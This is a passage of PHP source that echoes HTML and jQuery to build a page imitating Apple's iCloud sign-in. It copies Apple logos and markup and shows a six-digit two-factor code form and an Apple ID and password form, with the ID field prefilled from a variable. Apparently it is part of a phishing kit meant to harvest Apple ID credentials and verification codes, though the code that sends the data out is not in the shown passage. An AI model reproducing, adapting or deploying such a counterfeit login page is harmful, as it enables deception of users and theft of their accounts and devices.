echo "		$(\"#icon_10\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_10\").css(\"width\", res);\n";
echo "		$(\"#icon_10\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_11\").css(\"left\", left+(intre+res)*4);\n";
echo "		$(\"#icon_11\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_11\").css(\"width\", res);\n";
echo "		$(\"#icon_11\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_12\").css(\"left\", left+(intre+res)*5);\n";
echo "		$(\"#icon_12\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_12\").css(\"width\", res);\n";
echo "		$(\"#icon_12\").css(\"height\", res * 1.34);\n";
echo "	  }\n";
echo "	});</script>\n";
echo "	<script>\n";
echo "		$(document).click(function(evt) {\n";
echo "		   if(!$(evt.target).is(\".form-textbox\")) {\n";
echo "			//event handling code\n";
echo "			$(\"#vo_border\").removeClass(\"password-focus\");\n";
echo "			$(\"#vo_border\").removeClass(\"apple-id-focus\");\n";
echo "			$(\"#separator\").removeClass(\"password-focus\");\n";
echo "			$(\"#separator\").removeClass(\"apple-id-focus\");\n";
echo "			$(\"#account_name_text_field\").blur();\n";
echo "			$(\"#password_text_field\").blur();\n";
echo "		  }\n";
echo "		});\n";
echo "		</script>\n";
echo "		<script>\n";
echo "		$(document).on(\"touchstart\", function(evt) {\n";
echo "		   if(!$(evt.target).is(\".form-textbox\")) {\n";
echo "			//event handling code\n";
echo "			$(\"#vo_border\").removeClass(\"password-focus\");\n";
echo "			$(\"#vo_border\").removeClass(\"apple-id-focus\");\n";
echo "			$(\"#separator\").removeClass(\"password-focus\");\n";
echo "			$(\"#separator\").removeClass(\"apple-id-focus\");\n";
echo "		//        $(\"#account_name_text_field\").blur();\n";
echo "		//        $(\"#password_text_field\").blur();\n";
echo "		  }\n";
echo "		});\n";
echo "		</script>\n";
echo "	</head>\n";
echo "	\n";
echo "	<body class=\"tk-body \">\n";
echo "	  <div class=\"cloudos-loading-screen\" id=\"cw-bootstrap-html\">\n";
echo "		<div class=\"header\" id=\"cloudos-loading-screen-header\">\n";
echo "			<div class=\"icloud-logo-wrapper\">\n";
echo "				<div class=\"div-wrapping-icloud-logo\">\n";
echo "					<svg class=\"icloud-logo\" version=\"1\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 118 34\">\n";
echo "						<path stroke=\"none\" d=\"M1 3.9c0-1.4 1.2-2.6 2.6-2.6 1.4 0 2.6 1.1 2.6 2.5S5.1 6.4 3.7 6.4h-.1C2.2 6.5 1 5.3 1 3.9zm.4 5.8h4.5v22H1.4v-22zm8.8 6.9C10.2 7 15.7 1 24.1 1 31 1 36.2 5.2 37 11.5h-4.7c-.8-3.9-4.1-6.4-8.2-6.4-5.5 0-9.1 4.5-9.1 11.5s3.5 11.5 9.1 11.5c4.2 0 7.2-2.2 8.2-5.8H37c-1.2 6.2-5.9 9.9-12.9 9.9-8.5 0-13.9-6-13.9-15.6zM40.9 1.5h4.5v30.2h-4.5V1.5zm18.7 7.9c-6.4 0-10.5 4.4-10.5 11.3S53.2 32 59.6 32s10.5-4.3 10.5-11.3c0-6.9-4-11.3-10.5-11.3zm0 18.8c-3.7 0-5.9-2.8-5.9-7.6 0-4.7 2.2-7.6 5.9-7.6s5.9 2.8 5.9 7.6-2.2 7.6-5.9 7.6zm33 3.5h-4.4v-3.8h-.1c-1.3 2.6-3.5 4-6.9 4-4.8 0-7.8-3.1-7.8-8.1V9.7h4.5v13.2c0 3.3 1.6 5.1 4.7 5.1 3.3 0 5.3-2.3 5.3-5.7V9.7h4.5l.2 22zm19.8-30.2v11.8h-.1c-1.3-2.4-3.8-3.9-6.9-3.9-5.5 0-9.3 4.4-9.3 11.2s3.8 11.2 9.3 11.2c3.2 0 5.7-1.5 7-4h.1v3.7h4.4v-30h-4.5zm-5.8 26.6c-3.5 0-5.9-2.9-5.9-7.4s2.3-7.4 5.9-7.4c3.5 0 5.8 2.9 5.8 7.4.1 4.5-2.3 7.4-5.8 7.4z\"/>\n";
echo "					</svg>\n";
echo "				</div>\n";
echo "	\n";
echo "			</div>\n";
echo "			<div class=\"apple-icon-wrapper\">\n";
echo "				<svg class=\"apple-icon\" xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"44\" viewBox=\"0 0 16 44\"><path d=\"M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31\"/></svg>\n";
echo "			</div>\n";
echo "			<div class=\"dummy-element\"></div>\n";
echo "		</div>\n";
echo "		<div class=\"content\">\n";
echo "			<div class=\"spinner-wrapper\">\n";
echo "				<svg class=\"spinner\" id=\"cloudos-loading-spinner\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"-1 -1 2 2\">\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.16863\" transform=\"rotate(0)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.2\" transform=\"rotate(30)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.21961\" transform=\"rotate(60)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.25882\" transform=\"rotate(90)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.32157\" transform=\"rotate(120)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.38039\" transform=\"rotate(150)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.43137\" transform=\"rotate(180)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.54118\" transform=\"rotate(210)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.65098\" transform=\"rotate(240)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.76078\" transform=\"rotate(270)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"0.90196\" transform=\"rotate(300)\"/>\n";
echo "					<rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(0,0,0)\" fill-opacity=\"1\" transform=\"rotate(330)\"/>\n";
echo "				</svg>\n";
echo "			</div>\n";
echo "		</div>\n";
echo "	</div>\n";
echo "	  <div class=\"toolbar-view base-application-toolbar-view cloud-os-application-toolbar-view dark-theme\" style=\"top: 0px;\">\n";
echo "		<div class=\"cloud-os-application-toolbar-left-view toolbar-left-view\"><span tabindex=\"0\" class=\"apple-icon-button cw-button\">\n";
echo "		  <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"44\" viewBox=\"0 0 16 44\"><path d=\"M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31\"></path></svg></span>\n";
echo "		  <div></div></div>\n";
echo "		  <div></div>\n";
echo "		  <div class=\"cloud-os-application-toolbar-right-view toolbar-right-view\"><span tabindex=\"0\" class=\"help-button cw-button\"><svg viewBox=\"0 0 34.314697265625 34.94622802734375\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" classname=\" glyph-box\"><g transform=\"matrix(1 0 0 1 -2.971651367187519 29.45111083984375)\"><path d=\"M 20.0879 5.49512 C 29.5176 5.49512 37.2207 -2.22461 37.2207 -11.6709 C 37.2207 -21.1006 29.5176 -28.8203 20.0879 -28.8203 C 10.6748 -28.8203 2.97168 -21.1006 2.97168 -11.6709 C 2.97168 -2.22461 10.6748 5.49512 20.0879 5.49512 Z M 20.0879 2.88867 C 11.9863 2.88867 5.66113 -3.60254 5.66113 -11.6709 C 5.66113 -19.7227 11.9863 -26.2139 20.0879 -26.2139 C 28.2061 -26.2139 34.5146 -19.7227 34.5146 -11.6709 C 34.5146 -3.60254 28.2061 2.88867 20.0879 2.88867 Z M 19.8057 -8.23438 C 20.6357 -8.23438 21.1338 -8.74902 21.1338 -9.41309 L 21.1338 -9.6123 C 21.1338 -10.542 21.6816 -11.123 22.8438 -11.8867 C 24.4541 -12.9492 25.5996 -13.9287 25.5996 -15.9043 C 25.5996 -18.6768 23.1426 -20.1543 20.3203 -20.1543 C 17.4648 -20.1543 15.5889 -18.8096 15.1406 -17.2822 C 15.041 -17 14.9912 -16.7344 14.9912 -16.4521 C 14.9912 -15.7051 15.5889 -15.3066 16.1367 -15.3066 C 17.083 -15.3066 17.2324 -15.8047 17.7637 -16.4355 C 18.3115 -17.3486 19.1084 -17.8965 20.2207 -17.8965 C 21.7314 -17.8965 22.7109 -17.0332 22.7109 -15.7715 C 22.7109 -14.6426 22.0137 -14.0947 20.5527 -13.082 C 19.374 -12.252 18.4775 -11.3721 18.4775 -9.76172 L 18.4775 -9.5459 C 18.4775 -8.66602 18.959 -8.23438 19.8057 -8.23438 Z M 19.7725 -3.27051 C 20.7188 -3.27051 21.5488 -4.03418 21.5488 -4.99707 C 21.5488 -5.97656 20.7354 -6.72363 19.7725 -6.72363 C 18.793 -6.72363 17.9795 -5.95996 17.9795 -4.99707 C 17.9795 -4.05078 18.8096 -3.27051 19.7725 -3.27051 Z\"></path></g></svg></span>\n";
echo "			 <div></div></div></div>\n";
echo "		  <!-- <div style=\"font-family:\"SF Pro Icons\"; width: 0px; height: 0px; color: transparent;\">.</div> -->\n";
echo "		  <!-- <div style=\"font-family:\"SF Pro Display\"; width: 0px; height: 0px; color: transparent;\">.</div> -->\n";
echo "		  <div class=\"si-body si-container container-fluid\" id=\"content\" data-theme=\"dark\"><apple-auth app-loading-defaults=\"{appLoadingDefaults}\" pmrpc-hook=\"{pmrpcHook}\">\n";
echo "		  <div class=\"widget-container fade-in  restrict-max-wh  fade-in \" data-mode=\"embed\" data-isiebutnotedge=\"false\">\n";
echo "		  <div id=\"step\" class=\"si-step hide\">\n";
echo "                    <logo {hide-app-logo}=\"hideAppLogo\" {show-fade-in}=\"showFadeIn\">    <div class=\"logo   signin-label  fade-in \">\n";
echo "                \n";
echo "                    <img class=\"cnsmr-app-image \" src=\"css3/r140.png\" srcset=\"\" style=\"width: 100px;\" alt=\"Application logo\">\n";
echo "            </div>\n";
echo "        \n";
echo "        \n";
echo "                \n";
echo "          </logo>\n";
echo "                <div id=\"stepEl\" class=\"   \"><hsa2 suppress-iforgot=\"{suppressIforgot}\" skip-trust-browser-step=\"{skipTrustBrowserStep}\">\n";
echo "            \n";
echo "                  \n";
echo "                  \n";
echo "                  \n";
echo "                  \n";
echo "                  \n";
echo "                  <div class=\"hsa2\">\n";
echo "            \n";
echo "                <verify-device {two-factor-verification-support-url}=\"twoFactorVerificationSupportUrl\" {recovery-available}=\"recoveryAvailable\" suppress-iforgot=\"{suppressIforgot}\">\n";
echo "            \n";
echo "                  \n";
echo "                  \n";
echo "                  \n";
echo "                  \n";
echo "                  \n";
echo "                  <div class=\"verify-device fade-in \">\n";
echo "            <div class=\"\">\n";
echo "                <h1 class=\"si-container-title tk-intro\" tabindex=\"-1\">\n";
echo $lang["WELCOME"] ; echo "\n";;echo $lang["PAGE_TITLE"];
echo " </h1>\n";
echo "                \n";
echo "                <div class=\"sec-code-wrapper\">\n";
echo "                    <security-code length=\"{codeLength}\" split=\"true\" type=\"tel\" sr-context=\"Enter Verification Code\" localised-digit=\"Digit\" error-message=\"\"><div class=\"security-code\">\n";
echo "          <idms-error-wrapper {disable-all-errors}=\"hasErrorLabel\" {^error-type}=\"errorType\" popover-auto-close=\"false\" {^idms-error-wrapper-classes}=\"idmsErrorWrapperClasses\" {has-errors-and-focus}=\"hasErrorsAndFocus\" {show-error}=\"hasErrorsAndFocus\" {error-message}=\"errorMessage\" {parent-container}=\"parentContainer\" {(enable-showing-errors)}=\"enableShowingErrors\" anchor-element=\"#security-code-wrap-1570120135426-1\">\n";
echo "          <div class=\"\" id=\"idms-error-wrapper-1570120135426-0\">\n";
echo "            \n";
echo "          <div id=\"security-code-wrap-1570120135426-1\" class=\"security-code-wrap security-code-6 split\" localiseddigit=\"Digit\">\n";
echo "              <div class=\"security-code-container force-ltr\">\n";
echo "                  <div class=\"field-wrap force-ltr\">\n";
echo "                      <input maxlength=\"1\" autocorrect=\"off\" autocomplete=\"off\" autocapitalize=\"off\" spellcheck=\"false\" type=\"tel\" id=\"char0\" class=\"form-control force-ltr form-textbox char-field\" aria-label=\"Enter Verification Code Digit 1\" placeholder=\"\" aria-describedby=\"idms-input-error-1570120135426-1\" data-index=\"0\">\n";
echo "                  </div>\n";
echo "                  <div class=\"field-wrap force-ltr\">\n";
echo "                      <input maxlength=\"1\" autocorrect=\"off\" autocomplete=\"off\" autocapitalize=\"off\" spellcheck=\"false\" type=\"tel\" id=\"char1\" class=\"form-control force-ltr form-textbox char-field\" aria-label=\"Digit 2\" placeholder=\"\" aria-describedby=\"idms-input-error-1570120135426-1\" data-index=\"1\">\n";
echo "                  </div>\n";
echo "                  <div class=\"field-wrap force-ltr\">\n";
echo "                      <input maxlength=\"1\" autocorrect=\"off\" autocomplete=\"off\" autocapitalize=\"off\" spellcheck=\"false\" type=\"tel\" id=\"char2\" class=\"form-control force-ltr form-textbox char-field\" aria-label=\"Digit 3\" placeholder=\"\" aria-describedby=\"idms-input-error-1570120135426-1\" data-index=\"2\">\n";
echo "                  </div>\n";
echo "                  <div class=\"field-wrap force-ltr\">\n";
echo "                      <input maxlength=\"1\" autocorrect=\"off\" autocomplete=\"off\" autocapitalize=\"off\" spellcheck=\"false\" type=\"tel\" id=\"char3\" class=\"form-control force-ltr form-textbox char-field\" aria-label=\"Digit 4\" placeholder=\"\" aria-describedby=\"idms-input-error-1570120135426-1\" data-index=\"3\">\n";
echo "                  </div>\n";
echo "                  <div class=\"field-wrap force-ltr\">\n";
echo "                      <input maxlength=\"1\" autocorrect=\"off\" autocomplete=\"off\" autocapitalize=\"off\" spellcheck=\"false\" type=\"tel\" id=\"char4\" class=\"form-control force-ltr form-textbox char-field\" aria-label=\"Digit 5\" placeholder=\"\" aria-describedby=\"idms-input-error-1570120135426-1\" data-index=\"4\">\n";
echo "                  </div>\n";
echo "                  <div class=\"field-wrap force-ltr\">\n";
echo "                      <input maxlength=\"1\" autocorrect=\"off\" autocomplete=\"off\" autocapitalize=\"off\" spellcheck=\"false\" type=\"tel\" id=\"char5\" class=\"form-control force-ltr form-textbox char-field\" aria-label=\"Digit 6\" placeholder=\"\" aria-describedby=\"idms-input-error-1570120135426-1\" data-index=\"5\">\n";
echo "                  </div>\n";
echo "              </div>\n";
echo "          </div>\n";
echo "          \n";
echo "          </div>\n";
echo "        </idms-error-wrapper>\n";
echo "        </div>\n";
echo "        </security-code>\n";
echo "                </div>\n";
echo "                <div class=\"si-info\">\n";
echo "                    <p>\n";
echo $lang["PROTECTED"];
echo "                        </p>\n";
echo "                </div>\n";
echo "                <div class=\"si-info\">\n";
echo "                    <p>\n";
echo $lang["CODESHOWN"];
echo "                        </p>\n";
echo "                </div>\n";


echo " <a class=\"si-link ax-outline tk-subbody lite-theme-override\" onclick=\"openForm()\" id=\"no-trstd-device-pop\" aria-haspopup=\"true\">
\n";
echo $lang["SIGN_IN_TITLE"]
;
echo "</a>\n
";

echo " <div class=\"spinner-container verifying-code\" id=\"verifying-code\"></div>\n";
echo "            </div>\n";
echo "            \n";
echo "                \n";
echo "                \n";
echo "        </div>\n";
echo "        <error-modal {(show-error-modal)}=\"showErrorModal\" {error-modal-title}=\"errorModalTitle\" {error-modal-message}=\"errorModalMessage\" {on-done}=\"@goBackToSignIn\"><idms-modal {(show)}=\"showErrorModal\" auto-close=\"false\" wrap-class=\"error-modal-wrapper \"> \n";
echo "        </idms-modal></error-modal>\n";
echo "                \n";
echo "          </verify-device>\n";
echo "            \n";
echo "            \n";
echo "        </div>\n";
echo "        \n";
echo "                \n";
echo "          </hsa2></div>\n";
echo "            </div>\n";
echo "	\n";
echo "		<div id=\"step2\" class=\"si-step hide\">\n";
echo "				<logo {hide-app-logo}=\"hideAppLogo\" {show-fade-in}=\"showFadeIn\">    <div class=\"logo   signin-label  fade-in \">\n";
echo "				<img class=\"cnsmr-app-image \" src=\"css3/r140.png\" srcset=\"\" alt=\"Application logo\" style=\"width: 100px;\">\n";
echo "		</div>\n";
echo "	  </logo>\n";
echo "			<div id=\"stepEl\" class=\"   \"><sign-in suppress-iforgot=\"{suppressIforgot}\" {on-test-idp}=\"@_onTestIdp\">\n";
echo "			  <div class=\"signin fade-in\" id=\"signin\">\n";
echo "				  <h1 tabindex=\"-1\" class=\"si-container-title tk-intro \">\n";
echo $lang["SIGN_IN_TITLE"];
echo "				      </h1>            \n";
echo "				<div class=\"container si-field-container  password-second-step\">\n";
echo "			  <div id=\"sign_in_form\" class=\"signin-form fed-auth hide-password\">\n";
echo "	  <div class=\"si-field-container container\">\n";
echo "		<div class=\"form-table\">\n";
echo "		  <div id=\"vo_border\" class=\"ax-vo-border      \"></div>\n";
echo "		  <div class=\"account-name form-row    \">\n";
echo "			<label class=\"sr-only form-cell form-label\" for=\"account_name_text_field\">\n";
echo "Sign in to iCloud Apple ID\n";
echo "			    </label>\n";
echo "			<div class=\"form-cell\">\n";
echo "			  <div class=\"form-cell-wrapper\">\n";
echo "				<input type=\"text\" class=\"form-textbox form-textbox-text\" id=\"account_name_text_field\" can-field=\"accountName\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" aria-required=\"true\" required=\"required\" aria-describedby=\"apple_id_field_label\" spellcheck=\"false\" ($focus)=\"appleIdFocusHandler()\" ($keyup)=\"appleIdKeyupHandler()\" ($blur)=\"appleIdBlurHandler()\" placeholder=\"\n";
echo $lang["APPLE_ID"];
echo " \" autofocus=\"\" onpaste=\"myPasteID()\" value=$ID>\n";
echo "				<span id=\"apple_id_field_label\" aria-hidden=\"true\" class=\" form-label-flyout\">\n";
echo  $lang["APPLE_ID"];
echo "				    </span>\n";
echo "			  </div>\n";
echo "			</div>\n";
echo "		  </div>\n";
echo "		  <div id=\"separator\" class=\"field-separator   \"></div>\n";
echo "		  <div id=\"div_password\" class=\"password form-row     \" aria-hidden=\"true\">\n";
echo "			<label class=\"sr-only form-cell form-label\" for=\"password_text_field\">\n";
echo $lang["PASSWORD"];
echo "</label>\n";
echo "			<div class=\"form-cell\">\n";
echo "			  <div class=\"form-cell-wrapper\">\n";
echo "				<input type=\"password\" class=\"form-textbox form-textbox-text\" id=\"password_text_field\" ($keyup)=\"passwordKeyUpHandler()\" ($focus)=\"pwdFocusHandler()\" ($blur)=\"pwdBlurHandler()\" aria-required=\"true\" required=\"required\" can-field=\"password\" autocomplete=\"off\" placeholder=\"\n";
echo $lang["PASSWORD"];
echo " \" tabindex=\"-1\" onpaste=\"myPastePW()\">\n";
echo "				<span id=\"password_field_label\" aria-hidden=\"true\" class=\" form-label-flyout\"> \n";
echo $lang["PASSWORD"];
echo "				</span>\n";
echo "				<span class=\"sr-only form-label-flyout\" id=\"invalid_user_name_pwd_err_msg\" aria-hidden=\"true\">\n";
echo "				  \n";
echo "				</span>\n";
echo "			  </div>\n";
echo "			</div>\n";
echo "		  </div>\n";
echo "		</div>\n";
echo "	  </div>\n";
echo "	  <div id=\"error_div\" class=\"pop-container error signin-error hide\">\n";
echo "		  <div class=\"error pop-bottom tk-subbody-headline\">\n";
echo "		  <p class=\"fat\" id=\"errMsg\">\n";
echo $lang["IDPWD_ERROR_ALERT2"];
echo "	\n";
echo "			<a class=\"si-link ax-outline thin tk-subbody\" href=\"https://iforgot.apple.com/password/verify/appleid\" target=\"_blank\">\n";
echo $lang["MOB_FORGOT_ID"];
echo "</a>\n";
echo "	\n";
echo "	\n";
echo "		  </div>\n";
echo "		</div>\n";
echo "	</div>\n";
echo "			\n";
echo "					\n";
echo "	\n";
echo "				  \n";
echo "	<div class=\"si-remember-password\">\n";
echo "    <i id=\"remember-me\" class=\"ax-outline icon icon_uncheck_2\" style=\"top: 9px; cursor:pointer; width:22px;\"></i>\n";
echo "              \n";
echo "              <label id=\"remember-me-label\" class=\"form-label\" style=\"padding-left: 6px\">\n";
echo $lang["KEEP_ME"];
echo "                  </label>\n";
echo "            </div>\n";
echo "					<div id=\"spinner_1\" class=\"spinner-container hide\" style=\"position: absolute; width: 602px; top: 10px;\">\n";
echo "						<div class=\"cloudos-loading-screen2\">\n";
echo "					   <div class=\"content\">\n";
echo "						 <svg class=\"spinner2\" id=\"cloudos-loading-spinner\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"-1 -1 2 2\">\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(255,255,255)\" transform=\"rotate(0)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(229,229,229)\" transform=\"rotate(30)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(193,193,193)\" transform=\"rotate(60)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(165,165,165)\" transform=\"rotate(90)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(138,138,138)\" transform=\"rotate(120)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(109,109,109)\" transform=\"rotate(150)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(96,96,96)\" transform=\"rotate(180)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(82,82,82)\" transform=\"rotate(210)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(65,65,65)\" transform=\"rotate(240)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(56,56,56)\" transform=\"rotate(270)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(51,51,51)\" transform=\"rotate(300)\"></rect>\n";
echo "						   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(43,43,43)\" transform=\"rotate(330)\"></rect>\n";
echo "						 </svg>\n";
echo "					   </div>\n";
echo "					 </div>\n";
echo "					   </div>\n";
echo "					   <div id=\"spinner_2\" class=\"spinner-container hide\" style=\"position: absolute; width: 602px; top: 53px;\">\n";
echo "						  <div class=\"cloudos-loading-screen2\">\n";
echo "				   \n";
echo "						   <div class=\"content\">\n";
echo "							 <svg class=\"spinner2\" id=\"cloudos-loading-spinner\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"-1 -1 2 2\">\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(255,255,255)\" transform=\"rotate(0)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(229,229,229)\" transform=\"rotate(30)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(193,193,193)\" transform=\"rotate(60)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(165,165,165)\" transform=\"rotate(90)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(138,138,138)\" transform=\"rotate(120)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(109,109,109)\" transform=\"rotate(150)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(96,96,96)\" transform=\"rotate(180)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(82,82,82)\" transform=\"rotate(210)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(65,65,65)\" transform=\"rotate(240)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(56,56,56)\" transform=\"rotate(270)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(51,51,51)\" transform=\"rotate(300)\"></rect>\n";
echo "							   <rect x=\"0.45625\" y=\"-0.09099\" width=\"0.54375\" height=\"0.18198\" rx=\"0.09099\" ry=\"0.09099\" fill=\"rgb(43,43,43)\" transform=\"rotate(330)\"></rect>\n";
echo "							 </svg>\n";
echo "						   </div>\n";
echo "						 </div>\n";
echo "						 </div>\n";
echo "				  <div class=\"spinner-container auth  hide \"></div>\n";
echo "				  <button id=\"sign-in\" tabindex=\"0\" class=\"si-button btn  fed-ui   fed-ui-animation-show   disable  remember-me   link \" aria-label=\"Continue              \" aria-disabled=\"true\" disabled=\"\" > <i class=\"icon icon_sign_in\"></i>\n";
echo "					<span class=\"text feat-split\">\n";
echo "Continue\n";
echo "					    </span>\n";
echo "					</button>\n";
echo "					<button id=\"sign-in-cancel\"  aria-label=\"Close\" aria-disabled=\"false\" tabindex=\"0\" class=\"si-button btn secondary feat-split  remember-me   link \">\n";
echo "					  <span class=\"text\">\n";
echo "Close\n";
echo "</span>\n";
echo "					</button>\n";
echo "				</div>\n";
echo "				<div class=\"si-container-footer\">\n";
echo "					<div class=\"separator \"></div>\n";
echo "					<div class=\"links tk-subbody\">\n";
